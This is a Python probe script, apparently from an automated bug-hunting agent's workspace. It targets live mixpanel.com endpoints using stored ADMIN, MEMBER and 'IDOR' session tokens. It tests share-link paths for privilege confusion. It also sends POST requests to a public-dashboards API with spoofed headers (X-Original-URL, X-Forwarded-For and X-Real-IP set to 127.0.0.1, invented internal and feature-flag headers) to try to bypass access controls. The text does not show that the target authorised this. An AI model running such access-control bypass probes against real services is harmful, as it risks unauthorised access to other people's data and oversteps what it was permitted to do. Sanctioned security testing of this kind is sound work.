#!/usr/bin/env python3
"""Final checks: privilege confusion + header-injection + identifying /p/ feature."""
import sys, os, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

sh = SafeHttp(allow_raw_for_waf=True)
TOK = json.load(open('/home/hunter/new_agent/targets/mixpanel/recon/tokens.json'))

def H(role=None, extra=None):
    if role:
        h = dict(TOK[role]['api_request_headers'])
    else:
        h = {}
    h["User-Agent"] = "Mozilla/5.0"
    if extra: h.update(extra)
    return h

BASE = "https://mixpanel.com"
LOG = open('/home/hunter/new_agent/results/mixpanel/probe_share14_log.txt', 'w')
def log(msg):
    print(msg); LOG.write(msg+"\n"); LOG.flush()

t = "2cv24kB3k5n9reXr9bSJKU"

# 1. Compare no-auth vs ADMIN auth on /p/<t> — privilege confusion?
log("=== /p/<token> with/without auth ===")
for role in [None, 'ADMIN', 'MEMBER', 'IDOR']:
    try:
        r = sh.request("GET", f"{BASE}/p/{t}", headers=H(role))
        log(f"  role={role} -> {r.status_code} len={len(r.text)} hash={hash(r.text)}")
    except Exception as e:
        log(f"  role={role} -> ERR {e}")
    time.sleep(0.5)

# 2. /public/<t> with/without auth
log("=== /public/<token> with/without auth ===")
for role in [None, 'ADMIN', 'MEMBER', 'IDOR']:
    try:
        r = sh.request("GET", f"{BASE}/public/{t}", headers=H(role))
        log(f"  role={role} -> {r.status_code} len={len(r.text)} hash={hash(r.text)}")
    except Exception as e:
        log(f"  role={role} -> ERR {e}")
    time.sleep(0.5)

# 3. Check what feature /p/<token> actually maps to (bookmark? public-dashboard? embed?)
# Compare response body to a known-different /p/<token>
import hashlib
for t2 in ["2cv24kB3k5n9reXr9bSJKU","5dbqyToAtFMaDJVJNzUeuG","BkaDwovdEpEcMJp33R6sah"]:
    try:
        r = sh.request("GET", f"{BASE}/p/{t2}", headers=H())
        h = hashlib.sha256(r.text.encode()).hexdigest()[:16]
        log(f"  /p/{t2} -> {r.status_code} len={len(r.text)} sha256={h}")
    except Exception as e:
        log(f"  /p/{t2} -> ERR {e}")
    time.sleep(0.5)

# 4. Header-injection on POST 500 — try X-Original-URL etc
log("=== Header injection on POST /public-dashboards/{DASH} ===")
PROJ=4025923; DASH=11207838
for extra in [
    {"X-Original-URL": f"/api/app/projects/{PROJ}/public-dashboards/{DASH}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Internal": "true"},
    {"X-Mixpanel-Feature": "public_dashboards"},
    {"X-MP-Feature-Flag": "public_dashboards"},
]:
    hh = dict(TOK['ADMIN']['api_request_headers']); hh["User-Agent"]="Mozilla/5.0"; hh["Accept"]="application/json"; hh["Content-Type"]="application/json"; hh["X-Requested-With"]="XMLHttpRequest"; hh.update(extra)
    try:
        r = sh.request("POST", f"{BASE}/api/app/projects/{PROJ}/public-dashboards/{DASH}", headers=hh, data="{}")
        log(f"  extra={extra} -> {r.status_code} body={r.text[:150]!r}")
    except Exception as e:
        log(f"  extra={extra} -> ERR {e}")
    time.sleep(0.5)

LOG.close()
